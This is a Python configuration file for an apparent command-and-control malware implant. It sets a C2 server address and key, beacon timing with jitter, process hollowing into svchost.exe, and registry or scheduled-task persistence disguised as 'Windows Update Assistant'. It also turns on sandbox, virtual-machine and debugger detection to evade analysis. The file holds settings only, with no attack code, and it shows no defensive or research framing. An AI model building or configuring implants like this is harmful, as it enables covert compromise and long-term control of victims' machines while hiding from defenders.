import os

# Server configuration
SERVER_URL = "https://10.211.55.5:8443"  # Change this to your C2 server IP
PSK = "default_psk"  # This should match your server's PSK

# Client configuration
BEACON_INTERVAL = 60  # Seconds between beacons
JITTER = 0.3  # Random jitter factor (0.0 to 1.0)

# Process hollowing configuration
TARGET_PROCESS = r"C:\Windows\System32\svchost.exe"

# Persistence configuration
PERSISTENCE_NAME = "Windows Update Assistant"
PERSISTENCE_METHOD = "registry"  # Options: "registry" or "scheduled_task"

# Anti-analysis settings
SANDBOX_SLEEP = 10  # Seconds to sleep for sandbox detection
VM_DETECT = True    # Enable VM detection
DEBUG_DETECT = True # Enable debugger detection 